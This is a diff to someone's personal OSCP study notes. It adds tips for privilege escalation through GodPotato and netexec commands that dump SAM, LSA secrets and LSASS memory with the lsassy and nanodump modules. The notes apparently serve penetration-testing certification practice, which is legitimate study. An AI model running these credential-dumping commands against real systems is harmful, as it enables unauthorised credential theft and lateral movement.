@@ -20,6 +20,18 @@ Test-NetConnection PIVOT_INTERNAL_IP -Port 4444
 ```
 
 ---
+
+1. if you have a admin shell via godpotato then its nt authority system
+
+2. meaning any command you run will work on that machine locally. cant add to domain admins but you can add to local administrators group, which once we do that, its easy to do enum outside of that shell with netexec smb
+
+3. oh yea, if you dont already along with doing --sam --lsa in the same command. run modules with netexec . . .   
+
+ netexec smb IP -u user -p password --sam --lsa
+ netexec smb IP -u user -p password -M lsassy
+  netexec smb IP -u user -p password -M nanodump
+  
+---
 ## Discovering Domain Name
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
